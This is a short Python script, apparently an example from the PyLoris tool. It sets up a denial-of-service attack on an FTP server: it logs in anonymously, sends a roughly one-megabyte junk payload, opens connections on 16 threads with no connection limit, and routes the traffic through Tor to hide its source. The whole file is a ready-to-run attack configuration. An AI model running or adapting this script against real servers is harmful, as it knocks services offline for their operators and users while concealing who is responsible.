#! /usr/bin/env python

"""
scriptloris_ftp.py
A quick script to demonstrate how PyLoris could be used to overwhelm
an FTP server. Routed through TOR for extra credit.

This script requires TOR to be setup and running on localhost:9050.
"""

host = 'ftp.example.com'
port = 21
sockshost = 'localhost'
socksport = 9050

from libloris import *

def main(host, port, sockshost, socksport):
    loris = ScriptLoris()

    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['request'] = 'USER anonymous\r\n'
    loris.options['request'] += 'PASS anonymous@domain.com\r\n'
    loris.options['request'] += 'A' * (1024 * 1042)

    loris.options['threadlimit'] = 16
    loris.options['connectionlimit'] = 0
    loris.options['timebetweenconnections'] = 0.01

    # Enable SOCKS5 on local port 9050
    loris.options['socksversion'] = 'SOCKS5'
    loris.options['sockshost'] = sockshost
    loris.options['socksport'] = socksport

    loris.mainloop()

if __name__ == "__main__":
    main(host, port, sockshost, socksport)
